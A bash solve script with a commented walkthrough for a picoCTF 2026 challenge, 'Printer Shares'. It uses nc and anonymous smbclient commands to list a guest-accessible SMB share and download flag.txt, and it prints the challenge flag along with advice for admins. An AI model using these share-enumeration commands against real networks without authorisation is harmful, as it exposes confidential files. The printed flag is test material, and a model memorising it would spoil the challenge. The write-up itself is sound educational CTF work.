#!/usr/bin/env bash
set -euo pipefail

# Challenge Name: Printer Shares
# Category: General Skills
# Difficulty: Medium
# Event: picoCTF 2026
# Author: JANICE HE
#
# Description:
# "Oops! Someone accidentally sent an important file to a network
# printer, can you retrieve it from the print server?"
#
# Given information from the challenge:
# Printer port shown in the prompt: 55031
# Suggested command in the prompt:
# nc -vz mysterious-sea.picoctf.net 55031
#
# Core lesson:
# Not every service gives you a banner or responds to random text.
# A lot of network services stay quiet until you speak the correct protocol.
#
# In this challenge, the port check is only the starting point.
# The real task is to recognize that the host exposes a printer-related file
# share over SMB and then use an SMB client to browse and retrieve the file.
#
# Real-world analogy:
# In an internal network, a printer or print server may expose shared storage
# for scanned documents, queued jobs, or logs. If guest access is enabled,
# sensitive documents can leak even when no software exploit is involved.
#
# That is a very real security lesson:
# misconfiguration alone can expose confidential data.
#
# High-level attack plan:
# 1. Confirm the challenge port is reachable.
# 2. Enumerate shares on the host with smbclient.
# 3. Identify the public guest-accessible share.
# 4. List files in that share.
# 5. Download flag.txt and read it locally.
#
# Step 1: Confirm the challenge port is open.
# Manual command:
# nc -vz mysterious-sea.picoctf.net 55031
#
# Reason:
# This verifies that the service is alive and that we can reach the challenge
# host on the forwarded port.
#
# Important observation:
# Reaching a port does not mean it will reply to plain text. Many services do
# nothing until the client speaks the right protocol.
#
# Step 2: Enumerate the available SMB shares.
# Manual command:
# smbclient -L //mysterious-sea.picoctf.net -p 55031 -N
#
# Reason:
# -L asks smbclient to list the remote shares.
# -p 55031 tells it to use the forwarded challenge port instead of default SMB
# ports.
# -N means "no password", which tests guest/anonymous access.
#
# In the solved instance, this reveals a public share named:
# shares
#
# Step 3: Connect to the public share and list files.
# Manual command:
# smbclient //mysterious-sea.picoctf.net/shares -p 55031 -N -m SMB3 -c 'ls'
#
# Reason:
# We connect directly to the "shares" share and request a directory listing.
# Using -m SMB3 keeps the client on a modern dialect that works cleanly through
# the challenge port forward.
#
# The listing shows:
# - dummy.txt
# - flag.txt
#
# Step 4: Download the flag file.
# Manual command:
# smbclient //mysterious-sea.picoctf.net/shares -p 55031 -N -m SMB3 -c 'get flag.txt'
#
# Reason:
# Once a share is exposed to guests, file retrieval is as simple as using the
# normal client command. There is no memory corruption here. The weakness is
# access control: the file is available to anyone who can authenticate as guest.
#
# Step 5: Read the recovered file locally.
# Manual command:
# sed -n '1,20p' flag.txt
#
# Reason:
# After download, the file is just a normal local file in our challenge folder,
# so reading it gives the flag.
#
# Real-world security concept:
# This is a classic "sensitive file exposure" case caused by an overly
# permissive share. In a real environment, an admin should:
# - disable guest access
# - restrict share permissions
# - isolate printer storage from general network users
# - audit queued document retention
#
# Flag obtained:
# picoCTF{5mb_pr1nter_5h4re5_9fc5e085}

host="${1:-mysterious-sea.picoctf.net}"
port="${2:-55031}"
share_dir="$(cd "$(dirname "$0")" && pwd)"

cd "$share_dir"
rm -f flag.txt

smbclient "//$host/shares" -p "$port" -N -m SMB3 -c 'get flag.txt' >/dev/null
grep -o 'picoCTF{[^}]*}' flag.txt
